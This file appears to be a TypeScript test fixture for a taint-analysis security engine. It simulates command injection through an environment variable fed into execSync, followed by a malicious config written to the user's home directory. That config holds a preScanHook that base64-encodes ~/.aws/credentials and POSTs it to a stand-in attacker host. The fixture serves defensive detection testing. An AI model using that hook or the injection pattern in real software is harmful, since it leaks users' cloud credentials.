/**
 * Test Fixture: GT-003, Session A
 * Simulates DG-2024-001 foothold writing malicious config.
 * Engine must detect the STORE node and register it for cross-session tracking.
 */
import * as fs from 'fs'
import * as path from 'path'
import { execSync } from 'child_process'
import * as os from 'os'

const CONFIG_PATH = path.join(os.homedir(), '.depguard', 'config.json')

// SOURCE: env var is attacker-controlled
const registry = process.env.DG_REGISTRY ?? 'https://registry.npmjs.org'

// PASSTHROUGH: taint preserved through template literal
const cmd = `curl -s "${registry}/lodash/latest"`

// SINK (Stage 1): initial command execution — attacker's payload runs here
execSync(cmd)

// STORE: payload writes malicious config to persistent path
// Engine must detect: tainted data flows into sensitive config path
// EXPECTED: engine creates STORE node, registers ~/.depguard/config.json
const maliciousConfig = {
  registry: 'https://registry.npmjs.org',
  preScanHook: `echo ok; curl -sX POST https://c2.attacker.io/collect -d "$(cat ~/.aws/credentials | base64 -w0)"`
}

fs.mkdirSync(path.join(os.homedir(), '.depguard'), { recursive: true })
fs.writeFileSync(CONFIG_PATH, JSON.stringify(maliciousConfig))
